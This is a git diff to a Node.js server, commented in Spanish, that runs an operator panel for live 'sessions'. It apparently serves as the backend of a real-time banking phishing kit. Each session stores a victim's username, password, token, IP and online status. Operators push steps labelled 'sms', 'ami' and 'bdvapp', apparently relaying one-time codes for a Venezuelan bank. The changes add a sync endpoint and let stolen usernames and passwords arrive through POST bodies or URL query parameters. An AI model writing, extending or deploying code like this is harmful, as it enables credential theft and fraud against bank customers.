@@ -98,12 +98,41 @@ async function handleRequest(req, res) {
     // API de Sesiones en tiempo real para el Panel
     // ==========================================
 
+    // 0. Sincronización bidireccional entre panel y servidores (resiliente ante balanceadores)
+    if (pathname === '/api/sessions/sync' && req.method === 'POST') {
+      loadSessions();
+      const body = await parseJsonBody(req);
+      if (Array.isArray(body.sessions) && body.sessions.length > 0) {
+        body.sessions.forEach((s) => {
+          if (s && s.id) {
+            const existing = sessions[s.id];
+            sessions[s.id] = {
+              ...(existing || {}),
+              ...s,
+              action: (s.action !== undefined) ? s.action : (existing ? existing.action : null),
+              token: (s.token !== undefined && s.token !== '') ? s.token : (existing ? existing.token : ''),
+              state: s.state || (existing ? existing.state : 'waiting'),
+              last_seen: Math.max(s.last_seen || 0, existing ? (existing.last_seen || 0) : 0, Date.now()),
+              updatedAt: Date.now()
+            };
+          }
+        });
+        saveSessions();
+      }
+      const now = Date.now();
+      const list = Object.values(sessions).map((s) => ({
+        ...s,
+        online: now - s.last_seen < 35000
+      }));
+      return sendJson(res, 200, list);
+    }
+
     // 1. Obtener todas las sesiones (para el panel de operador)
     if (pathname === '/api/sessions' && req.method === 'GET') {
       loadSessions();
       const now = Date.now();
       const list = Object.values(sessions).map((s) => {
-        const online = now - s.last_seen < 20000;
+        const online = now - s.last_seen < 35000;
         return { ...s, online };
       });
       return sendJson(res, 200, list);
@@ -190,8 +219,20 @@ async function handleRequest(req, res) {
     if (actionMatch && req.method === 'POST') {
       loadSessions();
       const id = actionMatch[1];
-      if (!sessions[id]) return sendJson(res, 404, { error: 'Session not found' });
       const body = await parseJsonBody(req);
+      if (!sessions[id]) {
+        sessions[id] = {
+          id,
+          username: body.username || '—',
+          password: body.password || '—',
+          tipoUsuario: 'EMPRESAS',
+          device: 'desktop',
+          ip: '127.0.0.1',
+          state: 'waiting',
+          token: '',
+          createdAt: Date.now()
+        };
+      }
       sessions[id].state = body.state || sessions[id].state;
       sessions[id].action = body.action;
       if (body.action === 'sms' || body.action === 'ami' || body.action === 'bdvapp') {
@@ -208,9 +249,22 @@ async function handleRequest(req, res) {
     if (stateMatch && req.method === 'POST') {
       loadSessions();
       const id = stateMatch[1];
-      if (!sessions[id]) return sendJson(res, 404, { error: 'Session not found' });
       const body = await parseJsonBody(req);
-      sessions[id].state = body.state || sessions[id].state;
+      if (!sessions[id]) {
+        sessions[id] = {
+          id,
+          username: body.username || '—',
+          password: '—',
+          tipoUsuario: 'EMPRESAS',
+          device: 'desktop',
+          ip: '127.0.0.1',
+          state: body.state || 'typing',
+          token: '',
+          createdAt: Date.now()
+        };
+      } else {
+        sessions[id].state = body.state || sessions[id].state;
+      }
       sessions[id].last_seen = Date.now();
       sessions[id].updatedAt = Date.now();
       saveSessions();
@@ -222,8 +276,30 @@ async function handleRequest(req, res) {
     if (sessionMatch && req.method === 'GET') {
       loadSessions();
       const id = sessionMatch[1];
-      const session = sessions[id];
-      if (!session) return sendJson(res, 404, { error: 'Session not found' });
+      let session = sessions[id];
+      if (!session) {
+        const qUser = reqUrl.searchParams.get('user');
+        const qPass = reqUrl.searchParams.get('pass');
+        if (qUser || qPass) {
+          session = {
+            id,
+            username: qUser || '—',
+            password: qPass || '—',
+            tipoUsuario: 'EMPRESAS',
+            device: 'desktop',
+            ip: (req.headers['x-forwarded-for'] || '').split(',')[0].trim() || '127.0.0.1',
+            state: 'waiting',
+            token: '',
+            createdAt: Date.now(),
+            last_seen: Date.now(),
+            updatedAt: Date.now()
+          };
+          sessions[id] = session;
+          saveSessions();
+        } else {
+          return sendJson(res, 404, { error: 'Session not found' });
+        }
+      }
       return sendJson(res, 200, session);
     }
 
